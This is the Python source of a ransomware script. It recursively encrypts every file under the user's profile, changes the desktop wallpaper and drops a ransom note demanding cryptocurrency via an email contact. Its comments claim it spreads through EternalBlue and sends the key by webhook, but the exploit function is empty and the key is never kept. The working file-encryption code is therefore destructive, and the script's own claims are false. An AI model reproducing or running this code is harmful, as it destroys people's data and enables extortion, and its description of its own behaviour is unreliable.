#! /usr/bin/python3

"""
Ransomware with Python and Fernet, it will use the eternalblue exploit, created by the NSA and leakkeated by Shadow Brokers. 
if the pc is vulnerable to that exploit, the ransom would spread all over the network.
"""

from cryptography.fernet import Fernet
from impacket import smb, ntlm
from struct import pack
import urllib.request
import requests
import json
import socket
import ctypes
import time
import os

f = []

#Searches for the file in the folders and corresponding subfolders, then adds the found files with their paths to the "f" list
#i.e. ["C:\\Users\\whoami\\test.txt", "C:\\Users\\whoami\\desktop\\nano.txt", "C:\\Users\\whoami\\Downloads\\router.pdf"]
def find():
    os.chdir(os.environ["USERPROFILE"])  
    for folder, subfolder, files in os.walk(os.getcwd()):
        if "AppData" in folder:
            continue
        for file in files:
            if file == "Ransom.exe":
                continue
            f.append(os.path.join(folder, file))

def note():
    date = time.strftime("%d/%m/%y %H:%M:%S")
    with open("note.txt", "a") as f:
        f.write("""
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files. 
Don't try to screw me, only I can decrypt the files, don't you dare to use tools in the hope that they will work, 
as soon as i get my crypto i will give you the decryptor.
contact me at this email for all the details: rootnet_nightmare@protonmail.com

All this is your fault, I only exploited a flaw, specifically EternalBLue and smbghost,
An exploit (EternlaBlue) created by the NSA and leaked by the hacker group Shadow Brokers (Russian),
it's not my fault if you use outdated and not updated Operating Systems(i.e. Windows 7 and Windows 10 without updating it). 
I hope this serves as a lesson to you.
we are not criminals, we are not bad people, we are hackers, and as such, we see things where normal people see nothing.
I don't know if there will be more attacks, be on the lookout: https://icsavona2.edu.it

Hacked by Rootnet, your worst nightmare.
""")

#Change wallpaper
def change_wallpaper():
    user = os.environ["USERPROFILE"]
    path = f"{user}\\r.jpg"
    img = "https://imgix.bustle.com/inverse/55/ac/05/60/3298/48a5/a667/950275fac747/v-for-vendetta-decade-wachowskis-dark-knight-anonymous.png?w=1200&h=630&fit=crop&crop=faces&fm=jpg"
    urllib.request.urlretrieve(img, path)
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

#Start encryption file with Fernet symetric encryption and send key with request/webhook

def encrypt():
    Key = Fernet.generate_key()
    for file in f:
        with open(file, "rb") as tf:
            contents = tf.read()
        contents_encrypted = Fernet(Key).encrypt(contents)
        with open(file, "wb") as tf:
            tf.write(contents_encrypted)

#Exploiting "EternalBlue" for infect other computers with ransom
def exploit():
    """[*] Starting exploit..."""
 
find()
encrypt()      
change_wallpaper()
note()

